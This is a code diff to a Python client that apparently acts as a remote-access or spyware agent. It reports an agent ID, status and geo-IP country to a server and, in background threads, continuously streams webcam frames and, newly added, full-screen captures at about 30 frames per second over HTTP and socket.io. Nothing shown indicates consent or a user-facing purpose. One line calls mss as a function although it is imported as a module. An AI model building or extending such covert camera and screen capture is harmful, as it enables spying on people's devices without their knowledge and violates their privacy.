@@ -1,8 +1,9 @@
-import time, uuid,requests,platform,psutil,os,subprocess,asyncio,cv2, threading
-
+import time, uuid,requests,platform,psutil,os,subprocess,asyncio,cv2, threading,mss, socketio
+import numpy as np
 from datetime import timedelta
 
 cap = cv2.VideoCapture(0)
+sio = socketio.Client()
 SERVER_URL = "http://127.0.0.1:5000"
 #AGENT_ID = str(uuid.uuid4())
 AGENT_ID = "a3d48220-27d8-4551-bb36-157433163ad1"
@@ -15,6 +16,34 @@ headers = {
         "X-Session-ID": f"{AGENT_ID}"
 }
 
+def start_screenshare():
+    try:
+        sio.connect(SERVER_URL)
+    except Exception as e:
+        print(f"Failed to connect: {e}")
+        return
+
+    with mss() as sct:
+        monitor = sct.monitors[1]  # Capture primary display
+
+        while sio.connected:
+            # Capture frame
+            screenshot = sct.grab(monitor)
+            frame = np.array(screenshot)
+
+            # Convert BGRA to BGR and downscale
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+            frame = cv2.resize(frame, (1280, 720))
+
+            # Encode as JPEG
+            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 55])
+
+            # Send binary data over WebSocket event
+            sio.emit('stream_frame', buffer.tobytes())
+
+            # Target ~30 FPS
+            time.sleep(0.03)
+
 def camera():
     while 1:
         ret, frame = cap.read()
@@ -24,11 +53,13 @@ def camera():
         files = {'image': ('frame.jpg', encoded_img.tobytes(), 'image/jpeg')}
         
         try:
-            response = requests.post(SERVER_URL+"/upload", files=files, timeout=1)
+            response = requests.post(SERVER_URL+"/cam", files=files, timeout=1)
         except requests.exceptions.RequestException as e:
             print(f"Error sending frame: {e}")
 
         time.sleep(0.03)
+
+
 
 def get_country():
     get_region = requests.get("https://www.whatismyip.net/geoip/")
@@ -85,6 +116,7 @@ def status():
 def main():
     threading.Thread(target=status).start()
         #get_task()
+    threading.Thread(target=start_screenshare).start()
     threading.Thread(target=camera).start()
 
 if "__main__" == __name__:
